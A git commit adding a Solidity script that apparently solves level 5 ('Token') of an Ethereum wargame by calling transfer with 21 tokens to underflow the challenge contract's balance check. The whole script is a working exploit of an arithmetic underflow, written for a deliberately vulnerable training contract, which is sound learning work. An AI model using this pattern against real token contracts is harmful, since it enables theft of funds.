2006fe15a8d9c43543335eafb74d15b849178f67
Smiling Heretic <smilingheretic.eth@proton.me>
2022-12-19 19:09:57 +0100

    add solution to level 5 token

---
+++ script/SolveLevel5.s.sol
@@ -0,0 +1,23 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "./SolveLevelBase.sol";
+import "../src/interfaces/IToken.sol";
+
+contract SolveLevel5 is SolveLevelBase {
+    function getInstanceCreationData()
+        internal
+        pure
+        override
+        returns (address levelAddress, uint256 value)
+    {
+        levelAddress = 0xbF361Efe3FcEc9c0139dEdAEDe1a76539b288935;
+        value = 0;
+    }
+
+    function solveLevel(address instanceAddress) internal override {
+        IToken instance = IToken(instanceAddress);
+
+        instance.transfer(instanceAddress, 21);
+    }
+}
